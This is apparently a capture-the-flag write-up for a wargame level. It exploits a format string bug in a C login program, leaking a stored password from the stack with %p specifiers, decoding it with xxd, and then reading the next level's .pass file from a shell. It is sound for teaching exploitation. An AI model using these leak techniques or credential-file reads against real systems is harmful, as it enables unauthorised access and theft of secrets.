# Level 02

## Overview
This level implements a "Secure Access System" that reads a password from a file, compares it with user input, and grants a shell if the password is correct. The vulnerability is a format string bug in the printf call that prints the username after a failed login attempt. By supplying format specifiers as the username, we can read arbitrary stack memory and leak the password stored from the file.

## The Challenge

```
    int32_t main() {
        char buf_1[0x30];  // Stores password from /home/users/level03/.pass
        char var_78[0x64]; // Stores username input
        char buf[0x40];    // Stores password input
        
        FILE* fp = fopen("/home/users/level03/.pass", "r");
        fread(&buf_1, 1, 0x29, fp);   // 41 bytes of password
        
        printf("--[ Username: ");
        fgets(&var_78, 0x64, stdin);
        
        printf("--[ Password: ");
        fgets(&buf, 0x64, stdin);
        
        if (!strncmp(&buf_1, &buf, 0x29)) {
            printf("Greetings, %s!\n", &var_78);
            system("/bin/sh");
            return 0;
        }
        
        printf(&var_78);   // <--- FORMAT STRING VULNERABILITY
        puts(" does not have access!");
    }

```

Key vulnerability: printf(&var_78) directly uses the user‑supplied username as the format string, allowing us to read (and potentially write) stack memory.

## Exploitation Process

Step 1: Leak Stack Contents with Format Specifiers
We can supply a series of %p tokens to dump stack values as pointers. This will reveal the password that was read from the file and remains on the stack.
```
python -c "print('%p.'*50)" | ./level02

0x7fffffffe500.(nil).0x25.0x2a2a2a2a2a2a2a2a.0x2a2a2a2a2a2a2a2a.0x7fffffffe6f8.0x1f7ff9a08.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x2e7025.(nil).(nil).(nil).(nil).(nil).0x100000000.(nil).
0x756e505234376848.0x45414a3561733951.0x377a7143574e6758.0x354a35686e475873.0x48336750664b394d.(nil)...
```

The 8‑byte values at positions 21–25 (counting from the first %p) are ASCII‑encoded hexadecimal strings. These are the 41‑byte password split into 8‑byte chunks, stored in little‑endian order.

## Step 2: Extract and Decode the Password Chunks

Each chunk must be interpreted as a little‑endian integer and then reversed to obtain the correct character sequence.

# . Decode each position

level02@OverRide:~$ echo -n '756e505234376848' | xxd -r -p | rev
Hh74RPnu
level02@OverRide:~$ echo -n '45414a3561733951' | xxd -r -p | rev
Q9sa5JAE
level02@OverRide:~$ echo -n '377a7143574e6758' | xxd -r -p | rev
XgNWCqz7
level02@OverRide:~$ echo -n '354a35686e475873' | xxd -r -p | rev
sXGnh5J5
level02@OverRide:~$ echo -n '48336750664b394d' | xxd -r -p | rev
M9KfPg3H

# 3. Login with extracted password
```
level02@OverRide:~$ ./level02
--[ Username: level02
--[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
Greetings, level02!
$ cat /home/users/level03/.pass
```

## Summary

Vulnerability: Format string in printf(&var_78) allows reading stack memory.
Exploitation:

1. Send %p format specifiers to leak stack values
2. Password stored at stack positions 21-25
3. Decode hex values (reverse for little-endian)
4. Concatenate to get full password
5. Login with extracted password

